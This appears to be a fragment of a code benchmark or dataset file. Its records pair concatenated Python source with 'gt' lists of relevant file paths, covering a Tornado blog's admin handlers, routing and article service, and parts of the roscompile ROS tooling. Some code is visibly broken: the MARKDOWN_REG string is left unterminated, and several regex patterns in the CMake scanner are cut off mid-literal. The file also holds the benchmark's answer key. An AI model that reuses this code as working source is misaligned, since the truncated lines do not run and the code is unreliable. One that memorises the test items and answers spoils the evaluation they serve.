ArticleAndCommentsFlush):\n\n    @coroutine\n    def get(self, *require):\n        if require:\n            if len(require) == 1:\n                action = require[0]\n                if action == 'submit':\n                    yield self.submit_get()\n                elif action.isdigit():\n                    article_id = int(action)\n                    yield self.article_get(article_id)\n        else:\n            yield self.page_get()\n\n    @coroutine\n    def post(self, *require):\n        if require:\n            if len(require) == 1:\n                if require[0] == 'submit':\n                    yield self.submit_post()\n                elif require[0].isdigit():\n                    article_id = int(require[0])\n                    yield self.update_post(article_id)\n            elif len(require) == 2:\n                article_id = require[0]\n                action = require[1]\n                if action == 'delete':\n                    yield self.delete_post(article_id)\n\n    @coroutine\n    @authenticated\n    def page_get(self):\n        pager = Pager(self)\n        article_search_params = ArticleSearchParams(self)\n        article_types = yield self.async_do(ArticleTypeService.list_simple, self.db)\n        pager = yield self.async_do(ArticleService.page_articles, self.db, pager, article_search_params)\n        self.render(\"admin/manage_articles.html\", article_types=article_types, pager=pager,\n                    article_search_params=article_search_params)\n\n    @coroutine\n    @authenticated\n    def article_get(self, article_id):\n        article_types = yield self.async_do(ArticleTypeService.list_simple, self.db)\n        article = yield self.async_do(ArticleService.get_article_all, self.db, article_id, True)\n        self.render(\"admin/submit_articles.html\", article_types=article_types, article=article)\n\n    @coroutine\n    @authenticated\n    def submit_get(self):\n        article_draft = self.session.pop(session_keys['article_draft'], None)\n        article = None\n        if article_draft:\n            source_id = article_draft.get(\"source_id\")\n            type_id = article_draft.get(\"articleType_id\")\n            article = Article(source_id=int(source_id) if source_id else None,\n                              title=article_draft.get(\"title\"),\n                              articleType_id=int(type_id) if type_id else None,\n                              content=article_draft.get(\"content\"),\n                              summary=article_draft.get(\"summary\"))\n        article_types = yield self.async_do(ArticleTypeService.list_simple, self.db)\n        self.render(\"admin/submit_articles.html\", article_types=article_types, article=article)\n\n    @coroutine\n    @authenticated\n    def submit_post(self):\n        article = dict(\n            source_id=self.get_argument(\"source_id\"),\n            title=self.get_argument(\"title\"),\n            articleType_id=self.get_argument(\"articleType_id\"),\n            content=self.get_argument(\"content\"),\n            summary=self.get_argument(\"summary\"),\n        )\n        article_saved = yield self.async_do(ArticleService.add_article, self.db, article)\n        if article_saved and article_saved.id:\n            yield self.flush_article_cache(Constants.FLUSH_ARTICLE_ACTION_ADD, article_saved)\n            self.add_message('success', u'保存成功!')\n            self.redirect(self.reverse_url('article', article_saved.id))\n        else:\n            self.add_message('danger', u'保存失败！')\n            self.session[session_keys['article_draft']] = article\n            self.redirect(self.reverse_url('admin.article.action', 'submit'))\n\n    @coroutine\n    @authenticated\n    def update_post(self, article_id):\n        article = dict(\n            id=article_id,\n            source_id=self.get_argument(\"source_id\"),\n            title=self.get_argument(\"title\"),\n            articleType_id=self.get_argument(\"articleType_id\"),\n            content=self.get_argument(\"content\"),\n            summary=self.get_argument(\"summary\"),\n        )\n        article_updateds = yield self.async_do(ArticleService.update_article, self.db, article)\n        if article_updateds:\n            yield self.flush_article_cache(Constants.FLUSH_ARTICLE_ACTION_UPDATE, article=article_updateds)\n            article_updated = article_updateds[0]\n            self.add_message('success', u'修改成功!')\n            self.redirect(self.reverse_url('article', article_updated.id))\n        else:\n            self.add_message('danger', u'修改失败！')\n            self.redirect(self.reverse_url('admin.article', article_id))\n\n    @coroutine\n    @authenticated\n    def delete_post(self, article_id):\n        article_deleted, comments_deleted = yield self.async_do(ArticleService.delete_article, self.db, article_id)\n        if article_deleted:\n            yield self.flush_article_cache(Constants.FLUSH_ARTICLE_ACTION_REMOVE, article_deleted)\n            yield self.flush_comments_cache(Constants.FLUSH_COMMENT_ACTION_REMOVE, comments_deleted)\n            self.add_message('success', u'删除成功,并删除{}条评论!'.format(len(comments_deleted)))\n            self.write(\"success\")\n        else:\n            self.add_message('danger', u'删除失败！')\n            self.write(\"error\")\n\n\nclass AdminArticleCommentHandler(BaseHandler, ArticleAndCommentsFlush):\n    @coroutine\n    def get(self, *require):\n        yield self.page_get()\n\n    @coroutine\n    def post(self, *require):\n        if require:\n            if len(require) == 3:\n                article_id = require[0]\n                comment_id = require[1]\n                action = require[2]\n                if action == 'disable':\n                    yield self.disable_post(article_id, comment_id, True)\n                elif action == 'enable':\n                    yield self.disable_post(article_id, comment_id, False)\n                elif action == 'delete':\n                    yield self.delete_post(article_id, comment_id)\n\n    @coroutine\n    @authenticated\n    def page_get(self):\n        pager = Pager(self)\n        comment_search_params = CommentSearchParams(self)\n        comment_search_params.show_article_id_title = True\n        comment_search_params.order_mode = CommentSearchParams.ORDER_MODE_CREATE_TIME_DESC\n        comments_pager = yield self.async_do(CommentService.page_comments, self.db, pager, comment_search_params)\n        self.render(\"admin/manage_comments.html\", pager=comments_pager)\n\n    @coroutine\n    @authenticated\n    def disable_post(self, article_id, comment_id, disabled):\n        updated = yield self.async_do(CommentService.update_comment_disabled, self.db, article_id, comment_id, disabled)\n        if updated:\n            self.add_message('success', u'修改成功')\n            self.write(\"success\")\n        else:\n            self.add_message('danger', u'修改失败！')\n            self.write(\"error\")\n\n    @coroutine\n    @authenticated\n    def delete_post(self, article_id, comment_id):\n        comment_deleted = yield self.async_do(CommentService.delete_comment, self.db, article_id, comment_id)\n        if comment_deleted:\n            yield self.flush_comments_cache(Constants.FLUSH_COMMENT_ACTION_REMOVE, comment_deleted)\n            self.add_message('success', u'删除成功')\n            self.write(\"success\")\n        else:\n            self.add_message('danger', u'删除失败！')\n            self.write(\"error\")\n'blog_xtg/main.py'\n:\nimport os, sys\n\nimport concurrent.futures\nimport tornado.ioloop\nfrom sqlalchemy import create_engine\nfrom sqlalchemy.orm import sessionmaker\nfrom tornado.options import options\n\nimport log_config\nfrom config import config, redis_pub_sub_config, site_cache_config, redis_session_config\nfrom controller.base import BaseHandler\nfrom extends.cache_tornadis import CacheManager\nfrom extends.session_tornadis import SessionManager\nfrom service.init_service import flush_all_cache\nfrom service.pubsub_service import PubSubService\nfrom url_mapping import handlers\n\n\nsettings = dict(\n    template_path=os.path.join(os.path.dirname(__file__), \"template\"),\n    static_path=os.path.join(os.path.dirname(__file__), \"static\"),\n    compress_response=config['compress_response'],\n    xsrf_cookies=config['xsrf_cookies'],\n    cookie_secret=config['cookie_secret'],\n    login_url=config['login_url'],\n    debug=config['debug'],\n    default_handler_class=BaseHandler,\n)\n\n\n\ndef db_poll_init():\n    engine_config = config['database']['engine_url']\n    engine = create_engine(engine_config, **config['database'][\"engine_setting\"])\n    config['database']['engine'] = engine\n    db_poll = sessionmaker(bind=engine)\n    return db_poll\n\n\ndef cache_manager_init():\n    cache_manager = CacheManager(site_cache_config)\n    return cache_manager\n\n\n\nclass Application(tornado.web.Application):\n    def __init__(self):\n        super(Application, self).__init__(handlers, **settings)\n        self.session_manager = SessionManager(config['redis_session'])\n        self.thread_executor = concurrent.futures.ThreadPoolExecutor(config['max_threads_num'])\n        self.db_pool = db_poll_init()\n        self.cache_manager = cache_manager_init()\n        self.pubsub_manager = None\n\n\n\ndef parse_command_line():\n    options.define(\"port\", help=\"run server on a specific port\", type=int)\n    options.define(\"log_console\", help=\"print log to console\", type=bool)\n    options.define(\"log_file\", help=\"print log to file\", type=bool)\n    options.define(\"log_file_path\", help=\"path of log_file\", type=str)\n    options.define(\"log_level\", help=\"level of logging\", type=str)\n\n    options.define(\"master\", help=\"is master node? (true:master / false:slave)\", type=bool)\n\n    options.define(\"engine_url\", help=\"engine_url for sqlalchemy\", type=str)\n\n    options.define(\"redis_host\", help=\"redis host e.g 127.0.0.1\", type=str)\n    options.define(\"redis_port\", help=\"redis port e.g 6379\", type=int)\n    options.define(\"redis_password\", help=\"redis password set this option if has pwd \", type=str)\n    options.define(\"redis_db\", help=\"redis db e.g 0\", type=int)\n\n\n    options.logging = None\n    options.parse_command_line()\n\n    if options.port is not None:\n        config['port'] = options.port\n    if options.log_console is not None:\n        config['log_console'] = options.log_console\n    if options.log_file is not None:\n        config['log_file'] = options.log_file\n    if options.log_file_path is not None:\n        config['log_file_path'] = options.log_file_path\n    if options.log_level is not None:\n        config['log_level'] = options.log_level\n    if options.master is not None:\n        config['master'] = options.master\n    if options.engine_url is not None:\n        config['database']['engine_url'] = options.engine_url\n    if options.redis_host is not None:\n        redis_session_config['host'] = options.redis_host\n        site_cache_config['host'] = options.redis_host\n        redis_pub_sub_config['host'] = options.redis_host\n    if options.redis_port is not None:\n        redis_session_config['port'] = options.redis_port\n        site_cache_config['port'] = options.redis_port\n        redis_pub_sub_config['port'] = options.redis_port\n    if options.redis_password is not None:\n        redis_session_config['password'] = options.redis_password\n        site_cache_config['password'] = options.redis_password\n        redis_pub_sub_config['password'] = options.redis_password\n    if options.redis_db is not None:\n        redis_session_config['db_no'] = options.redis_db\n        site_cache_config['db_no'] = options.redis_db\n\n\nif __name__ == '__main__':\n    if len(sys.argv) >= 2:\n        if sys.argv[1] == 'upgradedb':\n\n            from alembic.config import main\n            main(\"upgrade head\".split(' '), 'alembic')\n            exit(0)\n\n    parse_command_line()\n\n    log_config.init(config['port'], config['log_console'],\n                    config['log_file'], config['log_file_path'], config['log_level'])\n\n    application = Application()\n    application.listen(config['port'])\n\n    config['application'] = application\n    loop = tornado.ioloop.IOLoop.current()\n\n    pubsub_manager = PubSubService(redis_pub_sub_config, application, loop)\n    pubsub_manager.long_listen()\n    application.pubsub_manager = pubsub_manager\n\n    if config['master']:\n        from extends.time_task import TimeTask\n        TimeTask(config['database']['engine']).add_cache_flush_task(flush_all_cache).start_tasks()\n    loop.start()\n\n'blog_xtg/url_mapping.py'\n:\nimport controller.home\nimport controller.admin\nimport controller.admin_custom\nimport controller.admin_article_type\nimport controller.admin_article\nimport controller.super\nfrom tornado.web import url\n\n\n\nhandlers = [\n    url(r\"/\", controller.home.HomeHandler, name=\"index\"),\n    url(r\"/auth/login\", controller.home.LoginHandler, name=\"login\"),\n    url(r\"/auth/logout\", controller.home.LogoutHandler, name=\"logout\"),\n\n    url(r\"/source/([0-9]+)/articles\", controller.home.articleSourceHandler, name=\"articleSource\"),\n\n    url(r\"/type/([0-9]+)/articles\", controller.home.ArticleTypeHandler, name=\"articleType\"),\n\n    url(r\"/article/([0-9]+)\", controller.home.ArticleHandler, name=\"article\"),\n    url(r\"/article/([0-9]+)/comment\", controller.home.ArticleCommentHandler, name=\"articleComment\"),\n\n    url(r\"/admin/account\", controller.admin.AdminAccountHandler, name=\"admin.account\"),\n    url(r\"/admin/help\", controller.admin.AdminHelpHandler, name=\"admin.help\"),\n    url(r\"/admin/account/(change-password|edit-user-info)\",\n        controller.admin.AdminAccountHandler, name=\"admin.account.update\"),\n\n    url(r\"/admin/custom/blog-info\",\n        controller.admin_custom.AdminCustomBlogInfoHandler, name=\"admin.custom.blog_info\"),\n    url(r\"/admin/custom/blog-plugin\",\n        controller.admin_custom.AdminCustomBlogPluginHandler, name=\"admin.custom.blog_plugin\"),\n    url(r\"/admin/custom/blog-plugin/(add)\",\n        controller.admin_custom.AdminCustomBlogPluginHandler, name=\"admin.custom.plugin.action\"),\n    url(r\"/admin/custom/blog-plugin/([0-9]+)/(sort-down|sort-up|disable|enable|edit|delete)\",\n        controller.admin_custom.AdminCustomBlogPluginHandler, name=\"admin.custom.plugin.update\"),\n\n    url(r\"/admin/articleType\", controller.admin_article_type.AdminArticleTypeHandler, name=\"admin.articleTypes\"),\n    url(r\"/admin/articleType/(add)\",\n        controller.admin_article_type.AdminArticleTypeHandler, name=\"admin.articleType.action\"),\n    url(r\"/admin/articleType/([0-9]+)/(delete|update)\",\n        controller.admin_article_type.AdminArticleTypeHandler, name=\"admin.articleType.update\"),\n\n    url(r\"/admin/articleType/nav\",\n        controller.admin_article_type.AdminArticleTypeNavHandler, name=\"admin.articleTypeNavs\"),\n    url(r\"/admin/articleType/nav/(add)\",\n        controller.admin_article_type.AdminArticleTypeNavHandler, name=\"admin.articleTypeNav.action\"),\n    url(r\"/admin/articleType/nav/([0-9]+)/(sort-down|sort-up|delete|update)\",\n        controller.admin_article_type.AdminArticleTypeNavHandler, name=\"admin.articleTypeNav.update\"),\n\n    url(r\"/admin/article/(submit)\", controller.admin_article.AdminArticleHandler, name=\"admin.article.action\"),\n    url(r\"/admin/article\", controller.admin_article.AdminArticleHandler, name=\"admin.articles\"),\n    url(r\"/admin/article/([0-9]+)\", controller.admin_article.AdminArticleHandler, name=\"admin.article\"),\n    url(r\"/admin/article/([0-9]+)/(delete)\", controller.admin_article.AdminArticleHandler, name=\"admin.article.update\"),\n\n    url(r\"/admin/comment\", controller.admin_article.AdminArticleCommentHandler, name=\"admin.comments\"),\n    url(r\"/admin/article/([0-9]+)/comment/([0-9]+)/(disable|enable|delete)\",\n        controller.admin_article.AdminArticleCommentHandler, name=\"admin.comment.update\"),\n\n    url(r\"/super/init\", controller.super.SuperHandler, name=\"super.init\"),\n]\n'blog_xtg/service/article_service.py'\n:\nimport logging\nimport re\n\nfrom model.site_info import SiteCollection\nfrom sqlalchemy.orm import joinedload, undefer\nfrom model.models import Article, Source\nfrom model.constants import Constants\nfrom model.search_params.article_params import ArticleSearchParams\nfrom . import BaseService\nfrom comment_service import CommentService\n\nlogger = logging.getLogger(__name__)\n\n\nclass ArticleService(object):\n    MARKDOWN_REG = \"[\\\\\\`\\*\\_\\[\\]\\\n    SUMMARY_LIMIT = 120;\n\n    @staticmethod\n    def get_article_all(db_session, article_id, show_source_type=False, add_view_count=None):\n        query = db_session.query(Article);\n        if show_source_type:\n            query = query.options(joinedload(Article.source)).\\\n                options(joinedload(Article.articleType).load_only(\"id\", \"name\"))\n        article = query.options(undefer(Article.summary), undefer(Article.content), undefer(Article.update_time)).\\\n            get(article_id)\n        if article and add_view_count:\n            article.num_of_view = Article.num_of_view + add_view_count\n            db_session.commit()\n        return article\n\n    @staticmethod\n    def page_articles(db_session, pager, search_params):\n        query = db_session.query(Article)\n        count = SiteCollection.article_count\n        if search_params:\n            if search_params.show_comments_count:\n                stmt = CommentService.get_comments_count_subquery(db_session)\n                query = db_session.query(Article, stmt.c.comments_count).\\\n                    outerjoin(stmt, Article.id == stmt.c.article_id)\n            if search_params.show_summary:\n                query = query.options(undefer(Article.summary))\n            if search_params.show_content:\n                query = query.options(undefer(Article.content))\n            if search_params.show_source:\n                query = query.options(joinedload(Article.source))\n            if search_params.show_article_type:\n                query = query.options(joinedload(Article.articleType).load_only(\"id\", \"name\"))\n            if search_params.order_mode == ArticleSearchParams.ORDER_MODE_CREATE_TIME_DESC:\n                query = query.order_by(Article.create_time.desc())\n            if search_params.source_id:\n                count = None\n                query = query.filter(Article.source_id == search_params.source_id)\n            if search_params.articleType_id:\n                count = None\n                query = query.filter(Article.articleType_id == search_params.articleType_id)\n        pager = BaseService.query_pager(query, pager, count)\n        if pager.result:\n            if search_params.show_comments_count:\n                result = []\n                for article, comments_count in pager.result:\n                    article.fetch_comments_count(comments_count if comments_count else 0)\n                    result.append(article)\n                pager.result = result\n        return pager\n\n    @staticmethod\n    def add_article(db_session, article):\n        try:\n            summary = article[\"summary\"].strip() if article[\"summary\"] else None\n            if not summary:\n                summary = ArticleService.get_core_content(article[\"content\"], ArticleService.SUMMARY_LIMIT)\n            article_to_add = Article(title=article[\"title\"], content=article[\"content\"],\n                                     summary=summary, articleType_id=article[\"articleType_id\"],\n                                     source_id=article[\"source_id\"])\n            db_session.add(article_to_add)\n            db_session.commit()\n            return article_to_add\n        except Exception, e:\n            logger.exception(e)\n        return None\n\n    @staticmethod\n    def update_article(db_session, article):\n        try:\n            summary = article[\"summary\"].strip() if article[\"summary\"] else None\n            if not summary:\n                summary = ArticleService.get_core_content(article[\"content\"], ArticleService.SUMMARY_LIMIT)\n            article_to_update = ArticleService.get_article_all(db_session, article[\"id\"])\n            article_old = Article(title=article_to_update.title, content=article_to_update.content,\n                                  summary=article_to_update.summary, articleType_id=article_to_update.articleType_id,\n                                  source_id=article_to_update.source_id)\n            article_to_update.title = article[\"title\"]\n            article_to_update.content = article[\"content\"]\n            article_to_update.summary = summary\n            article_to_update.articleType_id = int(article[\"articleType_id\"]) if article[\"articleType_id\"] else None\n            article_to_update.source_id = int(article[\"source_id\"]) if article[\"source_id\"] else None\n            db_session.commit()\n            return article_to_update, article_old\n        except Exception, e:\n            logger.exception(e)\n        return None\n\n    @staticmethod\n    def delete_article(db_session, article_id):\n        try:\n            article = db_session.query(Article).get(article_id)\n            if article:\n                comments_deleted = CommentService.remove_by_article_id(db_session, article_id, False)\n                db_session.delete(article)\n                db_session.commit()\n            return article, comments_deleted;\n        except Exception, e:\n            logger.exception(e)\n        return None\n\n    @staticmethod\n    def get_core_content(content, limit=0):\n        core_content = re.sub(ArticleService.MARKDOWN_REG, '', content)\n        if limit > 0:\n            return core_content[:limit]\n        return core_content\n\n    @staticmethod\n    def get_count(db_session):\n        article_count = db_session.query(Article).count()\n        return article_count\n\n\n    @staticmethod\n    def get_article_sources(db_session):\n        article_sources = db_session.query(Source).all()\n        if article_sources:\n            for source in article_sources:\n                source.fetch_articles_count()\n        return article_sources\n\n    @staticmethod\n    def set_article_type_default_by_article_type_id(db_session, article_type_id, auto_commit=True):\n        try:\n            db_session.query(Article).filter(Article.articleType_id == article_type_id).\\\n                update({Article.articleType_id: Constants.ARTICLE_TYPE_DEFAULT_ID})\n            if auto_commit:\n                db_session.commit()\n        except Exception, e:\n            logger.exception(e)\n",
        "gt": [
            "'blog_xtg/service/article_service.py'",
            "'blog_xtg/controller/admin_article.py'",
            "'blog_xtg/url_mapping.py'",
            "'blog_xtg/main.py'"
        ]
    },
    {
        "files": [
            "'roscompile/ros_introspection/src/ros_introspection/package.py'",
            "'roscompile/ros_introspection/src/ros_introspection/cmake_parser.py'",
            "'roscompile/ros_introspection/src/ros_introspection/util.py'",
            "'roscompile/roscompile/src/roscompile/misc.py'"
        ],
        "content": "'roscompile/ros_introspection/src/ros_introspection/package.py'\n:import collections\n\nfrom .cmake_parser import parse_file\nfrom .launch import LaunchXML\nfrom .package_structure import get_package_structure\nfrom .package_xml import PackageXML\nfrom .plugin_xml import PluginXML\nfrom .ros_generator import ROSGenerator\nfrom .rviz_config import RVizConfig\nfrom .setup_py import SetupPy\nfrom .source_code import SourceCode\nfrom .urdf import UrdfFile\n\n\nclass Package:\n    def __init__(self, root):\n        self.root = root\n        self.manifest = PackageXML(self.root + '/package.xml')\n        self.name = self.manifest.name\n        self.build_type = self.manifest.build_type\n        self.cmake = parse_file(self.root + '/CMakeLists.txt')\n\n        package_structure = get_package_structure(root)\n        self.source_code = SourceCode(package_structure['source'], self.name)\n        if self.cmake:\n            self.source_code.setup_tags(self.cmake)\n\n        self.launches = []\n        self.plugin_configs = []\n        self.urdf_files = []\n        for rel_fn, file_path in package_structure['launch'].items():\n            self.launches.append(LaunchXML(rel_fn, file_path))\n        for rel_fn, file_path in package_structure['plugin_config'].items():\n            self.plugin_configs.append(PluginXML(rel_fn, file_path))\n        for rel_fn, file_path in package_structure['urdf'].items():\n            self.urdf_files.append(UrdfFile(rel_fn, file_path))\n\n        self.setup_py = None\n        if 'setup.py' in package_structure['key']:\n            self.setup_py = SetupPy(self.name, package_structure['key']['setup.py'])\n        self.generators = collections.defaultdict(list)\n        for rel_fn, path in package_structure['generators'].items():\n            gen = ROSGenerator(rel_fn, path)\n            self.generators[gen.type].append(gen)\n        self.dynamic_reconfigs = package_structure['cfg'].keys()\n        self.urdf_files = []\n        for rel_fn, path in package_structure['urdf'].items():\n            self.urdf_files.append(UrdfFile(rel_fn, path))\n        self.rviz_configs = []\n        for rel_fn, path in package_structure[None].items():\n            if path.endswith('.rviz'):\n                self.rviz_configs.append(RVizConfig(rel_fn, path))\n        self.misc_files = list(package_structure[None].keys())\n\n    def is_metapackage(self):\n        return self.manifest.is_metapackage() or (self.cmake and self.cmake.is_metapackage())\n\n    def get_build_dependencies(self):\n        return self.source_code.get_build_dependencies()\n\n    def get_run_dependencies(self):\n        packages = set()\n        for launch in self.launches:\n            if launch.test:\n                continue\n            packages.update(launch.get_dependencies())\n\n        for urdf in self.urdf_files:\n            packages.update(urdf.get_dependencies())\n\n        for rviz_config in self.rviz_configs:\n            packages.update(rviz_config.get_dependencies())\n\n        if self.name in packages:\n            packages.remove(self.name)\n        return packages\n\n    def get_test_dependencies(self):\n        packages = set()\n        packages.update(self.source_code.get_test_dependencies())\n        for launch in self.launches:\n            if not launch.test:\n                continue\n            packages.add('rostest')\n            packages.update(launch.get_dependencies())\n        if self.name in packages:\n            packages.remove(self.name)\n        return packages\n\n    def get_all_generators(self):\n        for gens in self.generators.values():\n            for gen in gens:\n                yield gen\n\n    def get_dependencies_from_msgs(self):\n        packages = set()\n        for gen in self.get_all_generators():\n            packages.update(gen.dependencies)\n        if self.name in packages:\n            packages.remove(self.name)\n        return packages\n\n    def write(self):\n        self.manifest.write()\n        if self.cmake:\n            self.cmake.write()\n        for plugin_config in self.plugin_configs:\n            plugin_config.write()\n        if self.setup_py:\n            self.setup_py.write()\n        for gen in self.get_all_generators():\n            gen.write()\n        for src in self.source_code.sources.values():\n            src.write()\n        for config in self.rviz_configs:\n            config.write()\n\n    def __repr__(self):\n        s = '== {} ({})========\\n'.format(self.name, self.build_type)\n        s += '  package.xml\\n'\n        s += '  CMakeLists.txt\\n'\n        if self.setup_py:\n            s += '  setup.py\\n'\n        components = {'source': str(self.source_code),\n                      'launch': '\\n'.join(map(str, self.launches)),\n                      'dynamic reconfigure configs': '\\n'.join(self.dynamic_reconfigs),\n                      'plugin configs': '\\n'.join([cfg.rel_fn for cfg in self.plugin_configs]),\n                      'urdf models': '\\n'.join(map(str, self.urdf_files)),\n                      '{misc}': '\\n'.join(self.misc_files)\n                      }\n        for ext in self.generators:\n            components[ext] = '\\n'.join(map(str, self.generators[ext]))\n        for name, c_str in sorted(components.items()):\n            if len(c_str) == 0:\n                continue\n            s += '  {}\\n'.format(name)\n            for line in c_str.split('\\n'):\n                s += '    ' + line + '\\n'\n        return s\n\n'roscompile/ros_introspection/src/ros_introspection/cmake_parser.py'\n:import os.path\nimport re\nimport sys\n\nfrom .cmake import CMake, Command, CommandGroup, Section, SectionStyle\n\nALL_CAPS = re.compile('^[A-Z_]+$')\nALL_WHITESPACE = ['whitespace', 'newline']\nNOT_REAL = ALL_WHITESPACE + ['comment']\n\n\ndef word_cb(scanner, token):\n    if ALL_CAPS.match(token):\n        return ('caps', token)\n    else:\n        return ('word', token)\n\n\nscanner = re.Scanner([\n    (r'\n    (r'\"[^\"]*\"', lambda scanner, token: ('string', token)),\n    (r'\\(', lambda scanner, token: ('left paren', token)),\n    (r'\\)', lambda scanner, token: ('right paren', token)),\n    (r'[^ \\t\\r\\n()\n    (r'\\n', lambda scanner, token: ('newline', token)),\n    (r'[ \\t]+', lambda scanner, token: ('whitespace', token)),\n])\n\n\ndef match_command_groups(contents, base_depth=0):\n    revised_contents = []\n\n    current = []\n    group = None\n    depth = base_depth\n\n    for content in contents:\n        if group is None:\n            if content.__class__ == Command and content.command_name in ['if', 'foreach']:\n                group = content\n                depth = base_depth + 1\n            else:\n                revised_contents.append(content)\n        else:\n            if content.__class__ == Command:\n                if content.command_name == group.command_name:\n                    depth += 1\n                elif content.command_name == 'end' + group.command_name:\n                    depth -= 1\n                    if depth == base_depth:\n                        recursive_contents = match_command_groups(current, base_depth + 1)\n                        sub = CMake(initial_contents=recursive_contents, depth=base_depth + 1)\n                        cg = CommandGroup(group, sub, content)\n                        revised_contents.append(cg)\n                        group = None\n                        current = []\n                        continue\n            current.append(content)\n\n\n    if len(current) > 0:\n        revised_contents += current\n\n    return revised_contents\n\n\nclass CMakeParseError(Exception):\n    def __init__(self, msg):\n        Exception.__init__(self, msg)\n\n\nclass AwesomeParser:\n    def __init__(self, s, debug=False):\n        self.tokens, remainder = scanner.scan(s)\n        if remainder != '':\n            msg = 'Unrecognized tokens: %s' % (remainder)\n            raise ValueError(msg)\n\n        if debug:\n            for typ, token in self.tokens:\n                print('[%s]%s' % (typ, repr(token)))\n\n        self.contents = []\n        while len(self.tokens) > 0:\n            typ = self.get_type()\n            if typ == 'comment':\n                self.contents.append(self.match(typ))\n            elif typ == 'newline' or typ == 'whitespace':\n                s = self.match(typ)\n                self.contents.append(s)\n            elif typ in ['word', 'caps']:\n                cmd = self.parse_command()\n                self.contents.append(cmd)\n            else:\n                raise Exception('token ' + typ)\n\n\n        self.contents = match_command_groups(self.contents)\n\n        if debug:\n            for chunk in self.contents:\n                print('[%s]' % chunk)\n\n    def parse_command(self):\n        command_name = self.match()\n        original = command_name\n        cmd = Command(command_name)\n        while self.get_type() == 'whitespace':\n            s = self.match('whitespace')\n            cmd.pre_paren += s\n            original += s\n        original += self.match('left paren')\n        paren_depth = 1\n\n        while len(self.tokens) > 0:\n            typ = self.next_real_type()\n            if typ in ['word', 'caps', 'string']:\n                section, s = self.parse_section()\n                cmd.sections.append(section)\n                original += s\n            else:\n                typ, tok_contents = self.tokens.pop(0)\n                original += tok_contents\n                if typ == 'right paren':\n                    paren_depth -= 1\n                    if paren_depth == 0:\n                        cmd.original = original\n                        return cmd\n                elif typ == 'left paren':\n                    paren_depth += 1\n                else:\n                    cmd.sections.append(tok_contents)\n        raise CMakeParseError('File ended while processing command \"%s\"' % (command_name))\n\n    def parse_section(self):\n        original = ''\n        style = SectionStyle()\n        tokens = []\n        cat = ''\n        while self.get_type() in NOT_REAL:\n            s = self.match()\n            original += s\n            style.prename += s\n\n        if self.get_type() == 'caps':\n            cat = self.match('caps')\n            original += cat\n            style.name_val_sep = ''\n            while self.get_type() in ALL_WHITESPACE:\n                s = self.match()\n                original += s\n                style.name_val_sep += s\n            if len(style.name_val_sep) == 0:\n                style.name_val_sep = ' '\n\n        delims = set()\n        current = ''\n        while self.next_real_type() not in ['left paren', 'right paren', 'caps']:\n            typ = self.get_type()\n            if typ in ALL_WHITESPACE:\n                token = self.match()\n                original += token\n                current += token\n            else:\n                if len(current) > 0:\n                    delims.add(current)\n                current = ''\n                token = self.match()\n                original += token\n                tokens.append(token)\n        if len(current) > 0:\n            delims.add(current)\n        if len(delims) > 0:\n            if len(delims) == 1:\n                style.val_sep = list(delims)[0]\n            else:\n\n\n                style.val_sep = list(delims)[0]\n\n\n        return Section(cat, tokens, style), original\n\n    def match(self, typ=None):\n        if typ is None or self.get_type() == typ:\n            typ, tok = self.tokens.pop(0)\n\n            return tok\n        else:\n            sys.stderr.write('Token Dump:\\n')\n            for a in self.tokens:\n                sys.stderr.write(str(a) + '\\n')\n            raise CMakeParseError('Expected type \"%s\" but got \"%s\"' % (typ, self.get_type()))\n\n    def get_type(self):\n        if len(self.tokens) > 0:\n            return self.tokens[0][0]\n        else:\n            return None\n\n    def next_real_type(self):\n        for x, y in self.tokens:\n            if x not in NOT_REAL:\n                return x\n\n\ndef parse_commands(s):\n    parser = AwesomeParser(s)\n    return parser.contents\n\n\ndef parse_command(s):\n    parser = AwesomeParser(s)\n    assert len(parser.contents) == 1\n    return parser.contents[0]\n\n\ndef parse_file(filename):\n    if not os.path.exists(filename):\n        return\n    with open(filename) as f:\n        s = f.read()\n        return CMake(file_path=filename, initial_contents=parse_commands(s))\n\n'roscompile/ros_introspection/src/ros_introspection/util.py'\n:import os\nimport os.path\nimport sys\nimport traceback\n\nfrom .package import Package\n\n\ndef get_packages(root_fn='.', create_objects=True):\n    packages = []\n    for root, dirs, files in sorted(os.walk(root_fn)):\n        if '.git' in root:\n            continue\n        if 'package.xml' in files:\n            if create_objects:\n                try:\n                    packages.append(Package(root))\n                except Exception:\n                    sys.stderr.write('ERROR: Trouble parsing package @ %s\\n' % root)\n                    sys.stderr.write(traceback.format_exc())\n            else:\n                packages.append(root)\n    return packages\n\n\ndef get_sibling_packages(package):\n    parent_path = os.path.abspath(os.path.join(package.root, '..'))\n\n    sibling_packages = set()\n    for sub_package in get_packages(parent_path, create_objects=False):\n        pkg_name = os.path.split(sub_package)[1]\n        if pkg_name != package.name:\n            sibling_packages.add(pkg_name)\n    return sibling_packages\n\n'roscompile/roscompile/src/roscompile/misc.py'\n:import os\nimport re\nimport yaml\n\nfrom ros_introspection.rviz_config import dictionary_subtract\nfrom ros_introspection.util import get_sibling_packages\n\nfrom .util import PKG_PATH, make_executable, roscompile\n\nMAINPAGE_S = r'/\\*\\*\\s+\\\\mainpage\\s+\\\\htmlinclude manifest.html\\s+\\\\b %s\\s+<!--\\s+' + \\\n             r'Provide an overview of your package.\\s+-->\\s+-->\\s+[^\\*]*\\*/'\n\nRVIZ_CLASS_DEFAULTS = yaml.safe_load(open(PKG_PATH + '/data/rviz_class_defaults.yaml'))\nRVIZ_GLOBAL_DEFAULTS = yaml.safe_load(open(PKG_PATH + '/data/rviz_global_defaults.yaml'))\nROBOT_MODEL_LINK_DEFAULTS = {'Alpha': 1, 'Show Axes': False, 'Show Trail': False, 'Value': True}\n\n\n@roscompile\ndef check_dynamic_reconfigure(package):\n    cfgs = package.dynamic_reconfigs\n    if len(cfgs) == 0:\n        return\n    pkg_list = {'dynamic_reconfigure'}\n    package.manifest.add_packages(pkg_list, pkg_list)\n    package.cmake.section_check(cfgs, 'generate_dynamic_reconfigure_options', '')\n    package.cmake.section_check(pkg_list, 'find_package', 'COMPONENTS')\n\n    for fn in cfgs:\n        make_executable(os.path.join(package.root, fn))\n\n\n@roscompile\ndef remove_useless_files(package):\n    mainpage_pattern = re.compile(MAINPAGE_S % package.name)\n    for fn in package.misc_files:\n        if 'mainpage.dox' in fn:\n            full_path = os.path.join(package.root, fn)\n            s = open(full_path).read()\n            if mainpage_pattern.match(s):\n                os.remove(full_path)\n\n\n@roscompile\ndef update_metapackage(package, sibling_packages=None, require_matching_name=False):\n\n    if not package.is_metapackage():\n        return False\n\n    if require_matching_name:\n        parent_path = os.path.abspath(os.path.join(package.root, '..'))\n\n        if os.path.split(parent_path)[1] != package.name:\n     